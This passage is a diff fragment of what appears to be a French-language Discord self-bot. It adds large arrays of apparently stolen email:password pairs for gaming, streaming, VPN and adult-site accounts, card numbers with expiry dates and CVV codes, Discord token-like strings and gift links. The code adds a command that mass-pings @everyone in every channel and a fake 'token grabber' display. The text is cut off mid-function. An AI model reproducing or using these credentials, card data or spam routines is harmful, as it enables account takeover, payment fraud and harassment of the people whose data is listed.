+  "steven.dvorak88@gmail.com:Sd9807618  Units = 0 Level = 4 Tier = Blue Club Member = False Games = [ghost-recon-future-soldier]  Platforms =",
+  "stevenkeidel@gmail.com:Justice1  Units = 0 Level = 4 Tier = Blue Club Member = False Games = [watch-dogs]  Platforms = [PS4",
+  "boshi068@gmail.com:kirbyoshi Units = 0 Level = 12  Tier = Bronze Club Member = False Games = [anno-2070, far-cry-3, rocksmith-2014-edition]  Platforms = [PC, PC, PC",
+  "kazuo.st@gmail.com:kazu8086  Units = 0 Level = 3 Tier = Blue Club Member = False Games = [tom-clancy-the-division-2] Platforms = [PC]",
+  "drzanis@gmail.com:sh33pdog Units = 110 Level = 18  Tier = Bronze Club Member = False Games = [anno-2070, assassins-creed-brotherhood, far-cry-3, far-cry-3-blood-dragon, far-cry-4, , ghost-recon-future-soldier, prince-of-persia-forgotten-sands, silent-hunter-5, splinter-cell-conviction] Platforms = [PC, PC, PC, PC, PC, ANDROID, PC, PC, PC",
+  "poomin085771@gmail.com:555888Min",
+  "shadowkid323@yahoo.com:323Swaoso",
+  "wikjellsson@gmail.com:Dudesons1",
+  "andrrena4io@mail.ru:Lowotortokoo1",
+  "deniscernov@gmail.com:Parkurist070908",
+  "dwd15@hotmail.com:Dawoud87",
+  "isiaheholmes@gmail.com:Killer12",
+  "josiahmiller08@gmail.com:Tucker22",
+  "shaggydude47@hotmail.com:M3tal360",
+  "kikinavarro01@hotmail.com:Kiki2001",
+  "needforspeed425@yahoo.com:Volcom69",
+  "opp1opp1@yahoo.com.tw:Opp1opp2",
+  "vvomegavv@gmx.de:Vgn7javl",
+  "parhat1210@126.com:FarHat4539206",
+  "maxi-mome@bbox.fr:Maxou2005",
+  "carloskako2@gmail.com:Lucathor22",
+  "spw_wanstall@yahoo.co.uk:Tikiman266",
+  "fyrstenborg@hotmail.com:Hppsc2175",
+  "kombat2431@gmail.com:Komputer2",
+  "cockeram@msn.com:Blunty238",
+  "roy-raphael2002@hotmail.com:Raph4461",
+  "davidaguilar891@yahoo.com:Panther12",
+  "justinternet1@gmail.com:13Sandwich",
+  "roman.rinaldi@hotmail.com:Lolilo12",
+  "lawrencemayfield@hotmail.com:Tekken12",
+  "juandy.gp@gmail.com:N0entres",
+  "belias6070@gmail.com:Br3874el",
+  "nottalala5640@gmail.com:Lalaweki1",
+  "nchampion46@gmail.com:Skyline46",
+  "jjf.joseph@gmail.com:Marmite2543",
+  "adam@winkler.no:9w7s3gzT",
+  "romeox_69@hotmail.com:Chattupon1",
+  "roman988998@gmail.com:Pandora98",
+  "seanstover1@gmail.com:Soccerboy98",
+  "tipxdrakexdrfts@yahoo.com:Peehead2",
+  "edivhjortalus@yahoo.com:Shadow52",
+  "castle_tee@yahoo.com.au:Kuykay123",
+  "leejiashenq123@gmail.com:Shenqga123",
+  "cepheuse77@yahoo.com:Cndark77",
+  "sam_berube_14@hotmail.com:Gohabsgo18",
+  "huntg78@gmail.com:Havefun77",
+  "skrillexonrunescape@gmail.com:Hodgson235",
+  "tymeurland@gmail.com:Gurital1999"
+]
+
+const CC = [
+  '5491840062178813|05|2026|606',
+  '5491846063156450|02|2025|940',
+  '5491842653582528|09|2023|270',
+  '5491847675273758|03|2025|114',
+  '5491846270263560|12|2025|707',
+  '5491841044710772|01|2023|806',
+  '5491840440011264|10|2022|844',
+  '5491840865383578|11|2026|377',
+  '5491848158801214|11|2026|826',
+  '5491844468304627|04|2024|744',
+  '5491842537001257|03|2025|793',
+  '5491844028363626|06|2022|577',
+  '5491841341015263|10|2025|912',
+  '5491843587114685|10|2024|796',
+  '5491843376135305|09|2023|391',
+  '5491842146388707|05|2024|474',
+  '5491840736558127|03|2025|958',
+  '5491845158460835|06|2025|265',
+  '5491848308252482|11|2024|767',
+  '5491843855540850|04|2023|404',
+  '5491848508470355|03|2022|141',
+  '5491846174452178|09|2024|253',
+  '5491840405472758|09|2024|227',
+  '5491845073713300|06|2023|902',
+  '5491847833067753|10|2022|229',
+  '5491842871285425|01|2022|496',
+  '5491841673334175|05|2025|620',
+  '5491842861246734|01|2025|590',
+  '5491844450124645|05|2026|277',
+  '5491843012203723|01|2025|780',
+  '5491845268754473|01|2023|678',
+  '5491848260748113|10|2022|761',
+  '5491844537826055|11|2022|365',
+  '5491843528860164|01|2023|399',
+  '5491841728135437|09|2022|471',
+  '5491846136786267|04|2025|525',
+  '5491845077325101|10|2024|822',
+  '5491841103480846|09|2025|935',
+  '5491840506712847|12|2026|972',
+  '5491840682141100|06|2022|805',
+  '5491846255338841|08|2023|580'
+]
+
+var spotify = [
+  "zurobski@optusnet.com.au: Natsar77",
+  "canni86@alice.it: cannavaro28",
+  "dunand.guillaume@free.fr: babyc1",
+  "mzerzghi@charter.net: Eden1018",
+  "donovanauronforbes@yahoo.com: Snuffles93",
+  "DJReimei@gmail.com:Toshujin1",
+  "nikeboy32111@gmail.com:monSter1996",
+  "pjarasek@alumni.nd.edu:Shutout121",
+  "samfkissinger@gmail.com:Volvo1994",
+  "magixredux@gmail.com:screamo07",
+  "bdgolish@gmail.com:ramblers1",
+  "krobinson444@gmail.com:bryant64",
+  "ryanschaffer1@yahoo.com:Arrowhead10",
+  "bigbabymin@gmail.com:lmp,33food1",
+  "paulsifer22@gmail.com:pt042291",
+  "kyle_cifelli@yahoo.com:Duskborn1",
+  "joseco1805@gmail.com:jmts1805",
+  "missshannon02@gmail.com:diamonds03 | Subscription: Spotify Free | US | ",
+  "jamesgregory1119@gmail.com:Pineapples19 | Subscription: Spotify Free | US | ",
+  "gunjitsingh91@gmail.com:flanker143 | Subscription: Spotify Free | IN | ",
+  "cofran26@hotmail.com:popollo00 | Subscription: Spotify Free | AR | ",
+  "bilalyolver@hotmail.com:bilal2003 | Subscription: Spotify Free | TR | ",
+  "julianaa02@aol.com:JulianaA02 | Subscription: Spotify Free | US | ",
+  "madrileencm@gmail.com:august11996 | Subscription: Spotify Free | US | ",
+  "okpocharles84@gmail.com:emma8394 | Subscription: Spotify Free | TR | ",
+  "savitanjerry07@hotmail.com:Lovecouple08 | Subscription: Spotify Free | US | ",
+  "tflip08@gmail.com:bolts619 | Subscription: Spotify Free | US | ",
+  "curlinjah@gmail.com:condit2007 | Subscription: Spotify Free | US | ",
+  "jacqueline.lundsted@ksc.keene.edu:bunny1207 | Subscription: Spotify Free | US | ",
+  "youngkj@mountunion.edu:Raider7293 | Subscription: Spotify Free | US | ",
+  "marycameli@cox.net: Hubby123",
+  "lucasof@terra.com.br: akos1848",
+  "jk@persona.ca: jk911959",
+  "ivzanini@uol.com.br: ione0104",
+  "bert.geukens@telenet.be: bert2412",
+  "gnotes@cox.net: Rgpj1970",
+  "tlml.sev@orange.fr: co99al03",
+  "jean.van.de.weerdt@telenet.be: weerdt86",
+  "paola.migliorin@alice.it: paolam63",
+  "jorisdeblieck@telenet.be: 1x1x1x",
+  "jo.beaumat@orange.fr: oublier11",
+  "phie95@web.de: phie030795",
+  "barbara.quintelier@pandora.be: bquint0",
+  "geert.van.den.hende@telenet.be: vum13unk",
+  "valentin.jany@freenet.de: w1a2l3l4y5",
+  "vera.de.belder@telenet.be: Vera6780",
+  "fagner.santos@ibest.com.br: evikn45p",
+  "franckycud@orange.fr: kyfranthe2",
+  "waldoworldwide@charter.net: Odlaw366",
+  "lorajohnson@charter.net: Mustang01",
+  "ernabuitenhuis@planet.nl: bella1",
+  "josi_olga@uol.com.br: josi8602",
+  "bbriole@aliceadsl.fr: laurine"
+]
+
+
+var dofus = [
+  "Manuxhil2002:minecraft11 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "bluehazard17:1234566aa | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "eduardo821:eduardo24 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "comploadann:blanco987 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Iop - Niv. 42 - Brumen] | Nombre de Kamas = [Agride = , Brumen = 10 291] | Kamas en attente = [0, 0] | Abonné = False",
+  "hier631:Cireblanco7 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Atcham = 226] | Kamas en attente = [0] | Abonné = False",
+  "itznevers:16092001 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Iop - Niv. 44 - Julith, Ecaflip - Niv. 46 - Julith, Feca - Niv. 46 - Julith, Osamodas - Niv. 47 - Julith, Roublard - Niv. 54 - Julith] | Nombre de Kamas = [Julith = 17 144] | Kamas en attente = [0] | Abonné = False",
+  "Ptiteange90:smirnoff2611 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = 8, Ush = 23] | Kamas en attente = [0, 0] | Abonné = False",
+  "sovitta:62o2o20g | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Xelor - Niv. 68 - Meriana, Cra - Niv. 93 - Meriana, Pandawa - Niv. 73 - Meriana, Eniripsa - Niv. 167 - Meriana] | Nombre de Kamas = [Meriana = 13 751] | Kamas en attente = [0] | Abonné = False",
+  "CHERPIAT:k5hnnehx | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Atcham = 7] | Kamas en attente = [0] | Abonné = False",
+  "uncleparks:rsca1070 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = 41, Ilyzaelle = 432] | Kamas en attente = [0, 0] | Abonné = False",
+  "linknomade:digimon12 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Crocabulia = 242] | Kamas en attente = [0] | Abonné = False",
+  "billboquet29:Abcdefg39 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 400 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = , Merkator = 2] | Kamas en attente = [0, 0] | Abonné = False",
+  "mmicchaaell:qweasdzx123321 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Sram - Niv. 24 - Meriana] | Nombre de Kamas = [Agride = 98, Meriana = 8 159, Nidas = 11 410] | Kamas en attente = [0, 0, 0] | Abonné = False",
+  "Bashintor:Aimar1991 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Atcham = , Rubilax = 1 038] | Kamas en attente = [0, 0] | Abonné = False",
+  "shadowgeekou03:Gregdu03190 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Steamer - Niv. 23 - Meriana] | Nombre de Kamas = [Meriana = , Nidas = ] | Kamas en attente = [0, 0] | Abonné = False",
+  "Drakoloke:arwen1998 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "Mumacus:mumacus669 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "blanxo:dentistA21 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "cookloco:banana123 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "somariojv:Jvr19960 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "latinanhim:bigtop12 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "Reen69:manjivegeta1 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "loulourandy:spiderman | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = 1 558] | Kamas en attente = [0] | Abonné = False",
+  "Moniagun:azerty23 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "armandbibi:derfderf76 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Agride = ] | Kamas en attente = [0] | Abonné = False",
+  "connerdraggo:Clw12345 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "Dadaboro:dadaboro123 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Merkator = 30] | Kamas en attente = [0] | Abonné = False",
+  "anselmking:sol64pera | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "jose280p:junio123 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Eliotrope - Niv. 22 - Atcham] | Nombre de Kamas = [Atcham = 2 909] | Kamas en attente = [0] | Abonné = False",
+  "lmartin85:Soul1402 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "Fehriel:pc24041987 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Eniripsa - Niv. 82 - Pandore] | Nombre de Kamas = [Pandore = 9 983] | Kamas en attente = [0] | Abonné = False",
+  "kirisawa:majordome369 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Sacrieur - Niv. 38 - Pandore, Sadida - Niv. 41 - Pandore, Enutrof - Niv. 39 - Pandore, Iop - Niv. 37 - Pandore, Iop - Niv. 43 - Pandore] | Nombre de Kamas = [Pandore = 3 048] | Kamas en attente = [0] | Abonné = False",
+  "zell358:Perceval358 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = 2 510, Nidas = 41] | Kamas en attente = [0, 0] | Abonné = False",
+  "Opapay4:dragonne4 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "boefjuhnl:edwin777 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [Cra - Niv. 44 - Echo, Xelor - Niv. 29 - Echo, Iop - Niv. 53 - Echo] | Nombre de Kamas = [Echo = 44 943] | Kamas en attente = [0] | Abonné = False",
+  "blood4rose:Koetje4893 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "kaziz59:Nordin01 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = 4 608] | Kamas en attente = [0] | Abonné = False",
+  "juppi75:giulia08 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "chmoller:!dexter! | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False",
+  "Jooscia:Cerise59 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [Meriana = 246] | Kamas en attente = [0] | Abonné = False",
+  "WiFGameR:Alessio21 | SHIELD = False | Nombre de Goultines = 0 | Nombre d'Ogrines = 0 | Nombre de Kroz = 0 | Personnage = [] | Nombre de Kamas = [] | Kamas en attente = [] | Abonné = False"
+]
+
+
+var gtoken = [
+  "NzAzNjczNjQxNDEzNTA5MjEx.XqSBSQ.ZwpD-Do_c-a5z_ujbbq4iZq9wbQ",
+  "Njg5MTU2MzYyMzUzMzc3MzU3.XqVlHw.ZUqihZF1DSq-w4bgCcrblwH1Bcw",
+  "NTI3MTc1OTA2MDI5MDc2NDky.XWpmzg.hUEOHU1IhhdabT5AozUrZQkn8DQ",
+  "NzAzOTY1OTA4Nzk1Nzg1MjM2.XqWRWQ.X0xTTOUYjH6iPOJAz7K-4yp-mzo",
+  "NzAzNzA4MDUxMjI3ODAzNjg4.XqShZw.jMqW0x62qRe9NcYtgLUcxh6QTnw",
+  "NzAzNjc5ODg5MjA2NjczNDA4.XqSHOw.ykWPBoxWYPaaR0OWEyEa33SojCw",
+  "NjQ2MDk0MDkwOTQ0OTA1MjM4.XdMIZw.P8yTqKWm-0CNYbp4C8F_PraaYFs",
+  "NzAyNTUyMjkzNTkzMDU1MzAz.XqB2Pw.TGdpaNojvIoYKTYFQKMMJK6qF-4",
+  "NzA1MDY1MDg1MDU1NTMzMDU3.XqmRHg.ZiFzYah6XYAJs8C1347y8KMnMaM"
+]
+
+
+var nrdvpn = [
+  "kitader@gmail.com:Tomorrow6 | Expiration = 2022-05-22 02:32:47",
+  "jadenb551@gmail.com:Pookie234 | Expiration = 2020-06-08 20:19:21",
+  "He.francesco@gmail.com:Emily2014. | Expiration = 2022-06-19 16:50:44",
+  "alandalmau@icloud.com:Daymond0 | Expiration = 2020-06-01 02:39:12",
+  "Lvisng95@gmail.com:Lvisng95 | Expiration = 2020-06-03 18:49:28",
+  "kelvinzhang206@gmail.com:20020610 | Expiration = 2019-09-12 17:35:32",
+  "andresnr21@gmail.com:Batman21 | Expiration = 2022-03-18 18:59:52",
+  "mrgriggs1987@gmail.com:stephen1992 | Expiration = 2019-12-04 02:03:49",
+  "newlachlan@gmail.com:Soccer89 | Expiration = 2019-09-05 10:45:52",
+  "kivanctarlan@gmail.com:9surgeon123 | Expiration = 2022-02-09 20:01:33",
+  "luke02920@hotmail.com:Walkman1 | Expiration = 2021-12-13 14:42:13",
+  "thomasmalloy16@yahoo.com:Blackjack12 | Expiration = 2020-09-11 07:45:55",
+  "jmordan57@gmail.com:Rousseau1 | Expiration = 2021-08-08 01:51:17",
+  "josephriddle4@gmail.com:uncbball | Expiration = 2022-02-04 14:51:54",
+  "samijuju@yahoo.com:2precious | Expiration = 2022-07-27 23:18:32",
+  "jvasquez0206@yahoo.com:October21 | Expiration = 2020-05-05 18:45:48",
+  "cruzboy@me.com:Dbacks23 | Expiration = 2019-08-30 05:03:15",
+  "marksantos21@msn.com:oct102111 | Expiration = 2022-02-17 05:32:05",
+  "mzcvms@gmail.com:Iloveari1 | Expiration = 2019-09-07 05:18:10",
+  "johnoliverwalters@gmail.com:Mamamia2 | Expiration = 2019-10-18 10:22:39",
+  "ryan.augustino@gmail.com:skylin33x3 | Expiration = 2020-09-12 04:55:28",
+  "vincent59530@gmail.com:motdepasse75 | Expiration = 2019-09-03 07:04:43",
+  "norbertkasia55@gmail.com:norbert8 | Expiration = 2020-03-14 22:43:13",
+  "t.kokiri@hotmail.com:Jordan23 | Expiration = 2021-06-06 09:40:18",
+  "moizesomething@hotmail.com:Liverpool12 | Expiration = 2020-06-07 01:09:36",
+  "philippkielwein@gmail.com:philipp313 | Expiration = 2019-09-09 11:17:57",
+  "jylcook@gmail.com:Clearout1 | Expiration = 2019-09-24 06:44:01",
+  "davidcmulholland@gmail.com:Liam2014 | Expiration = 2019-11-06 17:28:04",
+  "danielorders101@gmail.com:Freedom18 | Expiration = 2019-09-12 21:06:31",
+  "yacine.bouagada1@gmail.com:zidane10 | Expiration = 2019-09-18 04:51:06",
+  "Adrimodzz@yahoo.de:Meerschweinchen1 | Expiration = 2020-06-29 20:32:29",
+  "acehardware182@yahoo.com:Redskins357 | Expiration = 2021-04-27 06:49:40",
+  "christophercrosbybrodka@gmail.com:inc0rrect | Expiration = 2020-07-01 16:14:40",
+  "chematorres2017@gmail.com:torres11 | Expiration = 2020-03-13 00:29:20",
+  "1pardot@gmail.com:cubiche1 | Expiration = 2022-03-23 00:50:02",
+  "coladx@gmail.com:Orange1234 | Expiration = 2022-04-17 01:40:13",
+  "ellenhymns@icloud.com:Wallflower17 | Expiration = 2020-06-23 10:51:37",
+  "cherrydub@gmail.com:R0adrunner | Expiration = 2020-04-25 11:15:20",
+  "ginaper94@yahoo.com:Texas1993 | Expiration = 2020-03-14 04:58:10",
+  "joshuatownsend28@yahoo.com:July2199 | Expiration = 2019-09-01 13:01:14"
+]
+
+
+var netflix = [
+  "shayona_dhanak@yahoo.com:dhanak18",
+  "amynaomi2001@gmail.com:amy10151981",
+  "an.deskins@hotmail.com:cougar85",
+  "benysachdeva171@gmail.com:viraaj2012",
+  "victoriaschubert1402@gmail.com:klavier1402",
+  "jahairaabreu@gmail.com:alvin0118",
+  "niknaks4.np@googlemail.com:nicola0077",
+  "tiffany_lemuss@yahoo.com:Chuncha123",
+  "luguito_03@hotmail.com:Swaggy0394",
+  "reifsteck.marie@gmail.com:Chevalier68",
+  "mireageorgiana41@gmail.com:Daimond77",
+  "caforummodi@gmail.com:Sunshine.24",
+  "maha.almarush@gmail.com:Mahawi84",
+  "elizabeth.aason@hotmail.com:Bethere23",
+  "briannarodriguez_meza@yahoo.com:Bri081201",
+  "kearney_17@hotmail.com:Lagrange_67",
+  "Steve31215@gmail.com:Steve15312!",
+  "Jonboetefuer@gmail.com:Tigers2020",
+  "trmason2121@gmail.com:Heyward22",
+  "gjmg106@yahoo.com:Mgross1125"
+]
+
+var pornhub = [
+  "norbertassss@gmail.com:zaibas123",
+  "panicmax469@gmail.com:animation1",
+  "kevin.kniss@Web.de:raiden12",
+  "nameloc_s@hotmail.com:ipwnj00ezpka",
+  "ellinas_4_lyf@hotmail.com:clk230",
+  "glowingorb@gmx.de:TdSoLi42",
+  "andrew.benjamin75@yahoo.com:tqu98577",
+  "cimmy7777@hotmail.com:txaidu43",
+  "GengarGrey@gmail.com:092598dlh",
+  "subzero2004@yandex.ru:PIER5768",
+  "feedcoma@gmail.com:yayluca123",
+  "toxinweb@gmail.com:azoz225",
+  "reidarpedersen@outlook.com:reidar123",
+  "kory_levesque@outlook.com:Jungope1",
+  "pavelznachoda@seznam.cz:Brokolice98",
+  "se.mcguire87@gmail.com:rowland23",
+  "osiris_chaoti@hotmail.com:natureangel23",
+  "rin.revell@gmail.com:shinev133",
+  "kdoggditty@yahoo.com:ZillaMonster1",
+  "bcarl@hotmail.com:Sanders21",
+  "louie_07_louie@yahoo.com:amaterasu321",
+  "justin.jman.weston@gmail.com:hobbit12",
+  "arisel00@gmail.com:bartek12",
+  "jaylen.forbes@yahoo.com:beoncey12",
+  "jake.armour@hotmail.com:Ja713750",
+  "blake120000@gmail.com:twiztid13",
+  "tarvusthegreat@gmail.com:Gr33nmile310",
+  "smittymitty19@gmail.com:Smitty37",
+  "swcw1211@aol.com:sw365533",
+  "cubigon@gmail.com:thunderbolt4",
+  "jeremyresults@gmail.com:qw12QW!@",
+  "silverwolfe42@gmail.com:nlsh39etrk",
+  "tyboman300@hotmail.com:InsonperneS23",
+  "daniel.wladika@gmx.at:daniel1232",
+  "pollardc33@gmail.com:heartgram7",
+  "neoredwolf11@gmail.com:yoi72Xyoi",
+  "nimirahb@gmail.com:bianca26",
+  "mikaelm2001@gmail.com:mikael01",
+  "dillow5@gmail.com:johnwall11",
+  "soulraver123456@gmail.com:Soulraver123",
+  "krisnordall@gmail.com:Kris1997",
+  "mschuetz82@gmail.com:cecil207",
+  "gengargrey@gmail.com:092598dlh",
+  "nollen.hager@gmail.com:safeway1",
+  "kneedragger1000@msn.com:Ekck1006",
+  "kory_levesque@outlook.com:Jungope1",
+  "speedzimba5@yahoo.com:Aa825607",
+  "soem28@gmail.com:Mthomas77",
+  "calebbp1@gmail.com:Lollypop1",
+  "halldor0gudmundsson@gmail.com:awesome123",
+  "quentin_laffez@hotmail.com:Cocacola91",
+  "ballinjoey2332@gmail.com:tehghozt15",
+  "mersky17@gmail.com:milobeast13",
+  "dotexex77@gmail.com:legendry123",
+  "calebharris50@gmail.com:Setzer321",
+  "smith.brayden00@gmail.com:Smithdawgs00",
+  "adrianpaul380@gmail.com:gummybear101",
+  "russelld.wolfe@yahoo.com:Airport1",
+  "yo_dig@hotmail.com:vincent513"
+]
+
+
+
+if (message.content.includes(prefix + "pingall")) {
+  if (message.deletable) message.delete();
+  let interval = setInterval(function() {
+      message.guild.channels.forEach(channel => {
+          if (channel.type === "text") channel.send(`@everyone  \n `);
+      }, 1500);
+  });
+}
+var facts = [
+  "https://discord.gift/qBn6HkYcfVvD7Z9RxRQqU9sa",
+  "https://discord.gift/CPPwF8yzbWeJenqRdCbGZ6GH",
+  "https://discord.gift/RqksgMqmyDMdxE8sD6htrwAJ",
+  "https://discord.gift/cXHje2gUfMNUxyrunHvrxFVw",
+  "https://discord.gift/8fWKKutPeqUyMM7ReqvKM7Ab",
+  "https://discord.gift/tdXxCG5XQAv9yBVPf5etqgp3",
+  "https://discord.gift/KAeaUr9p8QSt9X3NfWdf7Yz5",
+  "https://discord.gift/zef5CSyFEv7GU4vmmXywERNF",
+  "https://discord.gift/r43shVb9t4D7CfU53grgKMMr",
+  "https://discord.gift/TSYhjtk3pd9TnAvmpBG6XYJP",
+  "https://discord.gift/jXyzsSTtwdpWjnAmSAaNQrYc",
+  'https://discord.gift/95BJNgugy5TYrKAEGux6YtWM',
+  "https://discord.gift/jNMfGND88PePMVSKnx2YRQGS",
+  "https://discord.gift/9BNtz7PjpCZSV85sNaBsD9nB",
+  "https://discord.gift/6gPfQ3wsWYBs6dyPbyqT4aj3",
+  "https://discord.gift/rp2Z2sjJPqhjubjrwDDXa4cX",
+  "https://discord.gift/TC3W8QrrpmZkb3SsxRzpHTzT",
+  "https://discord.gift/cNFCnMGRaTBmcyeRu7NSsZqk",
+  "https://discord.gift/ATzSnmGTUcfFRag9Q49wqUpQ",
+  "https://discord.gift/rZQe9Pa3bCzrRw4wyQKWBsJV",
+  `https://discord.gift/HcY3zFzCWBMnfKz3q3mZkEZn`,
+  "https://discord.gift/NBhZwGtppWaG9mvtt4ekKMZZ",
+  "https://discord.gift/RTcWpYAB3YzFhdK5EPZBrcwZ",
+  "https://discord.gift/6VxXNZ8ut3ceeehdtTuQZJBE",
+  "https://discord.gift/JpzRdAtxBFyhxazm7XyG7mGA"
+];
+
+
+
+if (message.content.startsWith(prefix + "mail")) {
+  if (message.author.id === client.user.id) {
+      message.delete();
+      let user = message.mentions.users.first();
+      var embed = new Discord.RichEmbed()
+          .setColor(color)
+          .setTitle("mail de  " + client.user.tag)
+          .setDescription("**email : **" + client.user.mail)
+          .setFooter(message.author.username, message.author.avatarURL);
+
+      message.channel.send(embed);
+  }
+}
+
+if (message.content.startsWith(`${prefix}rtoken`)) {
+  if (message.author.id === client.user.id) {
+      if (!mentionuser) {
+          message.edit(':x: **Veuillez mentionner un utilisateur!**');
+          return;
+      }
+      let token = ["HircHg", "XnyXiA", "XluxwQ", "XXn_KA", "Xiq-WQ"];
+      let token1 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "xllelHltGdY7DP_0s1XST4cgzTs"];
+      var id = mentionuser.id;
+      var bytes = utf8.encode(id);
+      var encoded = base64.encode(bytes);
+      let embed_encode = new Discord.RichEmbed()
+          .setColor(color)
+          .setTitle(`Token match ${mentionuser.username}`)
+          .setDescription(`${encoded}.${token[Math.floor(Math.random() * token.length)]}.${token1[Math.floor(Math.random() * token1.length)]}`)
+      setTimeout(() => {
+          message.edit("░░░░░░░░░░ 0%");
+      }, 1000);
+      setTimeout(() => {
+          message.edit("▓▓░░░░░░░░ 20%");
+      }, 1500);
+      setTimeout(() => {
+          message.edit("▓▓▓▓░░░░░░ 40%");
+      }, 2000);
+      setTimeout(() => {
+          message.edit("▓▓▓▓▓▓░░░░ 60%");
+      }, 2500);
+      setTimeout(() => {
